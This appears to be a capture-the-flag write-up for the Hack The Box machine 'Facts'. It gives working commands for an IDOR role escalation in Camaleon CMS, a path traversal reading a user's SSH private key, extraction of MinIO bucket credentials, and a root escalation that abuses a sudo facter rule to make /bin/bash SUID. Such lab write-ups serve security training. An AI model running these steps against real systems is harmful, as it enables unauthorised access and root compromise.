---
layout: default
title: "Facts"
parent: Easy Machines
grand_parent: Machines
permalink: /machines/easy/facts/
---

# Facts

![Machine Badge](https://img.shields.io/badge/Machine-Facts-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Season](https://img.shields.io/badge/Season-10%20Week%201-purple)

| Property | Value |
|----------|-------|
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Release** | 2026-01-31 (Season 10, Week 1) |
| **Tags** | #web #idor #path-traversal #s3 #minio #ruby #sudo |

---

## Summary

Facts is the first machine of HTB Season 10 (Underground). It features a Ruby on Rails CMS called **Camaleon CMS** running with a path traversal vulnerability and an IDOR in the admin registration/update flow. Cloud storage credentials harvested from the CMS settings unlock a MinIO bucket holding the user's SSH private key. Root is achieved by abusing `sudo facter --custom-dir=`, which executes the first `.rb` script in the supplied directory as root.

---

## External Writeups

- [GitHub: lightbringer999/FACTS-HTB](https://github.com/lightbringer999/FACTS-HTB)
- [Medium - ItsSunshineXD (EN)](https://itssunshinexd.medium.com/htb-machine-facts-writeup-en-9db1ec215330)
- [Medium - wahyudnWis (S10)](https://medium.com/@mwahyudinwisesar/facts-s10-htb-writeup-3f6369768e57)
- [Ibrahim Isiaq Bolaji - Facts Walkthrough](https://www.ibrahimisiaqbolaji.com/2026/02/facts-hack-box-walkthrough.html)
- [CyberSecGuru: Mastering Facts](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/)
- [GitHub: CyberWarrior9 - Facts walkthrough](https://github.com/CyberWarrior9/HTB-Walkthroughs/blob/main/Facts/facts_htb_writeup.md)
- [HackMD - Facts Writeup](https://hackmd.io/wWxm2lupSjC-Ir5ELV6KVg)
- [1337 Sheets - FACTS Easy (Jan 31, 2026)](https://1337sheets.com/hack-the-box-season-htb-facts-writeup-easy-weekly-january/)

---

## Key Techniques

- IDOR on `/admin/users/{id}` (mass-assignment of `role`)
- Camaleon CMS v2.9.0 Path Traversal in `download_private_file` (auth required, critical)
- MinIO / S3-compatible object storage credential extraction
- SSH private key recovery from misconfigured bucket
- `sudo facter --custom-dir=` Ruby arbitrary file execution
- Hardcoded plaintext cloud storage credentials in CMS settings

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC facts.htb
# 22/tcp  ssh
# 80/tcp  nginx -> Camaleon CMS (Ruby on Rails)
```

Add `facts.htb` to `/etc/hosts`. Browse the site, locate `/admin/register`.

### 2. Foothold via IDOR

Register a low-privilege user. Camaleon's profile-update endpoint allows updating arbitrary attributes for any user (including `role`). Promote your account to `admin`:

```bash
curl -X PATCH http://facts.htb/admin/users/1 \
  -H "Cookie: _camaleon_session=<sess>" \
  -d "user[role]=admin"
```

### 3. Path Traversal (User Flag / SSH Key)

With admin access, `download_private_file` traverses outside the media root:

```
GET /admin/media/download_private_file?file=../../../../../home/sherman/.ssh/id_rsa
```

SSH in as the recovered user.

### 4. Cloud Storage Pivot

Inside `Settings -> General Site -> Filesystem Settings`, the CMS is wired to an S3-compatible MinIO bucket with plaintext access key + secret. Use `mc` or `aws s3 --endpoint-url`:

```bash
aws --endpoint-url http://facts.htb:9000 s3 ls
aws --endpoint-url http://facts.htb:9000 s3 cp s3://backups/id_rsa -
```

### 5. Root via Sudo Facter

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/facter --custom-dir=*
```

`facter` loads the first `.rb` file from the custom-dir path with Ruby; running as root means arbitrary code execution as root:

```bash
mkdir /tmp/pwn
cat > /tmp/pwn/pwn.rb <<'EOF'
Facter.add(:pwn) { setcode { system("chmod +s /bin/bash") } }
EOF
sudo /usr/bin/facter --custom-dir=/tmp/pwn
/bin/bash -p
# uid=1000(sherman) euid=0(root)
```

---

## Lessons Learned

- IDOR on role/privilege fields is still common in CMS frameworks - always test mass-assignment.
- Cloud storage credentials in CMS settings are a frequent secrets-in-config sink.
- `sudo` rules with `--custom-dir=*` or any `*` wildcard at the end of a Ruby/Python loader path are RCE-as-root.
- Camaleon CMS path traversal (no CVE assigned at retirement) underscores the value of reading source for new/niche CMS frameworks.
